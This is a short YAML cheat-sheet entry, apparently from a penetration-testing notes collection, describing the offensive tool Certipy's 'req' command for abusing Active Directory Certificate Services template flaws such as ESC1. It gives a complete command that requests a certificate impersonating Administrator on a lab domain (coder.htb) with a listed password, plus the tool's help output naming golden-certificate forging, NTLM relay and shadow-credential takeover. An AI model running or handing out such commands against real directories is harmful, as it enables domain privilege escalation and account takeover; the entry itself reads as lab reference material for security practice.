---
description: |
  Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). The req command is useful for requesting, retrieving, and renewing certificates. Which is useful for exploiting serveral certifacte templating vulnerabilities like ESC1, ESC2, etc.

  Command Reference:
  ```
  User: e.black

  Password: ypOSJXPqlDOxxbQSfEERy300

  arbitrary UPN: administrator

  domain: coder.htb

  DC: dc01.coder.htb

  CA: coder-DC01-CA
  ```
command: |
  certipy req -username e.black@coder.htb -password ypOSJXPqlDOxxbQSfEERy300 -ca coder-DC01-CA -target dc01.coder.htb -template newMaus -upn Administrator@coder.htb -dns dc01.coder.htb

code: |
    positional arguments:
    {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template}
                        Action
    account             Manage user and machine accounts
    auth                Authenticate using certificates
    ca                  Manage CA and certificates
    cert                Manage certificates and private keys
    find                Enumerate AD CS
    forge               Create Golden Certificates
    ptt                 Inject TGT for SSPI authentication
    relay               NTLM Relay to AD CS HTTP Endpoints
    req                 Request certificates
    shadow              Abuse Shadow Credentials for account takeover
    template            Manage certificate templates 

items:
  - Username
  - Password
services:
  - LDAP
  - ADCS
OS:
  - Windows
attack_types:
  - Enumeration
references:
  - https://github.com/ly4k/Certipy
---